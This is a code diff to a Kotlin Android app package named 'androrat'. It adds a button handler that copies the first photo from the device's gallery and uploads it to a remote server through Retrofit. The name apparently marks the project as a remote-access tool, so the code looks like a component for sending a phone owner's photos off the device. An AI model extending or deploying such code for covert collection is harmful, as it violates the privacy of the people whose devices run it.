@@ -2,15 +2,26 @@ package com.ierusalem.androrat.screens.images
 
 import android.content.ContentUris
 import android.os.Bundle
+import android.os.Environment
 import android.provider.MediaStore
+import android.util.Log
 import android.view.LayoutInflater
 import android.view.View
 import android.view.ViewGroup
+import androidx.compose.runtime.rememberCoroutineScope
 import androidx.compose.ui.platform.ComposeView
 import androidx.fragment.app.Fragment
 import androidx.fragment.app.viewModels
+import com.ierusalem.androrat.networking.RetrofitInstance
 import com.ierusalem.androrat.screens.home.Image
 import com.ierusalem.androrat.ui.theme.AndroRATTheme
+import kotlinx.coroutines.launch
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.MultipartBody
+import okhttp3.RequestBody
+import okhttp3.RequestBody.Companion.asRequestBody
+import java.io.File
+import java.io.FileOutputStream
 
 class ImageFragment : Fragment() {
 
@@ -92,7 +103,51 @@ class ImageFragment : Fragment() {
         return ComposeView(requireContext()).apply {
             setContent {
                 AndroRATTheme {
-                    ImagesScreen(images = viewModel.images)
+                    val scope = rememberCoroutineScope()
+
+                    ImagesScreen(
+                        images = viewModel.images,
+                        onUploadClick = {
+                            val apiService = RetrofitInstance(requireContext()).api
+                            val uri = viewModel.images[0].uri
+                            val inputStream = requireContext().contentResolver.openInputStream(uri)
+                            val image = File.createTempFile(
+                                "image",
+                                ".jpg",
+                                requireActivity().getExternalFilesDir(Environment.DIRECTORY_PICTURES)
+                            )
+                            val fileOutputStream = FileOutputStream(image)
+                            inputStream?.copyTo(fileOutputStream)
+                            fileOutputStream.close()
+
+                            val requestBody: RequestBody = MultipartBody.Builder()
+                                .setType(MultipartBody.FORM)
+                                .addFormDataPart("description", "easy")
+                                .addFormDataPart(
+                                    "file",
+                                    image.name,
+                                    image.asRequestBody(
+                                        "image/*".toMediaType()
+                                    )
+                                )
+                                .build()
+
+                            scope.launch {
+                               val response = apiService.postImage(requestBody)
+                                if (response.isSuccessful) {
+                                    Log.d(
+                                        "ahi3646_photo",
+                                        "sendMessages: success - ${response.body()} "
+                                    )
+                                } else {
+                                    Log.d(
+                                        "ahi3646_photo",
+                                        "sendMessages: failure  - ${response.errorBody()}}"
+                                    )
+                                }
+                            }
+                        }
+                    )
                 }
             }
         }
